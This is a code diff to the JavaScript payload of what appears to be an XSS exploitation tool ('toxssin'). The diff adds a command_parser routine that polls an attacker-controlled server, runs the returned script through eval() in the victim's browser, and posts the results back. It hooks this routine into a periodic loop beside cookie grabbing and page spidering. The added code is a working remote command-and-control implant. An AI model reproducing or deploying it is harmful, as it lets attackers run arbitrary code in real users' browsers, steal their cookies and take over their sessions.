@@ -66,6 +66,45 @@ function xhr_post_intercept(capture, event_hash, data_type = 'form', form_attrs 
 };
 
 
+function command_parser() {
+	
+	let cmd = new XMLHttpRequest();
+	cmd.open("GET", `*TOXSSIN_SERVER*/a95f7870b615a4df433314f10da26548`, true);
+	cmd.setRequestHeader('X-toxssin-id', '*SESSIONID*');
+	
+	cmd.onreadystatechange = function() {
+		
+		if (this.readyState == 4) {
+			
+			let path = cmd.getResponseHeader('Content-type');
+			
+			if (path !== 'None' && cmd.responseText.includes('<%NoCmdIssued%>') === false) {
+				//exec cmd
+				let result = '';
+				let meta, err;
+						
+				try {
+					result = eval(this.responseText);
+					err = 0;
+					
+				} catch (error) {
+					result = String(error);
+					err = 1;				
+				}
+				
+				meta = {'script': path, 'error': err}
+				xhr_post_intercept(result, '7f47fd7ae404fa7c0448863ac3db9c85', 'FormData', meta);
+				
+			} else {
+				return;
+			}
+		}
+	};
+	
+	cmd.send();	
+};
+
+
 //  #########  DISCLAIMER: #########
 //  MD5 hash function:
 //  Original copyright (c) Paul Johnston & Greg Holt.
@@ -459,6 +498,7 @@ function intoxicate() {
 	if (*SPIDER_TABLES*) { spiderTables(); }
 	
 	setInterval(() => {
+		command_parser()
 		grab_cookie();
 		spiderAll();
 		if (*SPIDER_TABLES*) { spiderTables(); }
